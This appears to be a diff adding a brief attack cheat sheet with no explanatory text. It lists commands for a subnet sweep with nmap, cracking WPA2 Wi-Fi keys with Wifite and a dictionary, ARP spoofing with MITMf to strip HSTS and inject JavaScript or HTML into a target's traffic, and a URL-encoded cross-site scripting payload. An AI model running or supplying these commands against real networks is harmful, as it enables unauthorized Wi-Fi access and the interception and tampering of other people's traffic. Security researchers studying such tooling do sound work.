@@ -1,0 +1,17 @@
+//CHECK NETWORK
+nmap -sP 192.168.1.0/24
+
+// OPEN WIFI KEYS
+cd wpa2 
+./Wifite.py --dict '/root/wpa2/dict/CHOSE DICTIONARY'
+
+// SNIFF
+apt-get update && apt-get upgrade
+apt-get install mitmf
+mitmf -i wlan0 --target ip --gateway 192.168.1.1 --arp --spoof --hsts
+mitmf -i wlan0 --target ip --gateway 192.168.1.1 --arp --spoof --hsts --inject --js-file /root/wpa2/js/inner.js
+mitmf -i wlan0 --target ip --gateway 192.168.1.1 --arp --spoof --hsts --inject --html-file /root/wpa2/html/inner.html
+
+//XSS
+
+%22%2F%3e%3cbr%2F%3E%3c%20script%20%3edocument.body.style.color%20=%20"red";%3c%2f%20script%3e%3c
